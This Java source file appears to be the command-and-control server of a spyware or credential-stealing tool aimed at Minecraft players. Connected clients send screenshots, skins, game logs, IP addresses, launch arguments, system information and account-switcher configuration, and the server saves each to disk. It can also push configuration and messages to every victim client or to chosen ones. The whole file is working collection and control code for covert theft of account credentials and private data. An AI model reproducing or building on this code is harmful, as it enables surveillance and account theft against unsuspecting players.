package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.shared.Crypto;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.TcpServer;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

public class Server extends TcpServer {
    private static final Logger LOGGER = LoggerFactory.getLogger(Server.class);
    private static final Gson GSON = new Gson();
    public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
    public final SendUtil send = new SendUtil();
    public final ClientConfigData clientDefaultConf = Utils.getDefaultClientConfig();
    public final ServerConfig config = Utils.getServerConfig();
    private int clientIndex = 0;

    public Server() throws IOException {
        super();
        LOGGER.info("Server Config: {}", GSON.toJson(config));
        LOGGER.info("Client Config: {}", GSON.toJson(clientDefaultConf));
        Crypto.INSTANCE = new Crypto(config.encryptionKey.getBytes());
        start(config.port);
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

    @Override
    public void onOpen(Connection conn) {
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        LOGGER.info("Client connected: {} ID: {}", address, clientIndex);
        clientMap.put(conn, new Info(clientIndex));
        clientIndex++;
    }

    @Override
    public void onMessage(Connection conn, Message message) {
        Info info = clientMap.get(conn);
        int id = info.index;
        LOGGER.info("Received message: {} From ID {}", message.data.getClass().getName(), id);
        try {
            if (message.data instanceof ByteData data) {
                switch (data.id) {
                    case "screenshot", "screenshot2" -> {
                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.id + "id", "png", String.valueOf(id), true));
                        FileUtil.write(file, data.bytes());
                    }
                    case "skin" -> {
                        String playerName = info.playerData.playerName;
                        File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.write(file, data.bytes());
                    }
                }
            } else if (message.data instanceof StringsData data) {
                if (data.data().length == 0 && data.id().equals("getconfig")) {
                    send.trySend(conn, new Message(clientDefaultConf));
                } else if (data.data().length == 1) {
                    String msg = data.data()[0];
                    switch (data.id()) {
                        case "logging" -> {
                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
                            String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                            FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                        }
                        case "ip" -> info.ip = msg;
                        case "iasconfig", "runargs", "systeminfo", "props" -> {
                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.playerData.playerName, true));
                            FileUtil.write(file, msg);
                        }
                    }
                }
            } else if (message.data instanceof PlayerData data) {
                info.playerData = data;
            } else {
                LOGGER.info("Message: {} {}", message.data.getClass().getName(), GSON.toJson(message.data));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onClose(Connection conn, DisconnectData disconnectData) {
        LOGGER.info("Client disconnected: ID: {}", clientMap.get(conn).index);
        clientMap.remove(conn);
    }

    public static class SendUtil {
        private List<Connection> connCollection;
        private boolean all = true;

        public void trySendBytes(Server server, String messageType, byte[] bytes) {
            trySend(server, Message.fromBytes(messageType, bytes));
        }

        public void trySendJson(Server server, String object) {
            trySend(server, Message.fromJson(object));
        }

        private void trySend(Server server, Message message) {
            if (all) {
                server.getConnections().forEach(conn -> trySend(conn, message));
            } else {
                connCollection.forEach(conn -> trySend(conn, message));
            }
        }

        public void trySend(Connection conn, Message message) {
            try {
                conn.send(message);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        public void setAll(boolean all) {
            this.all = all;
        }

        public void setConnCollection(List<Connection> connCollection) {
            this.all = false;
            this.connCollection = connCollection;
        }
    }
}
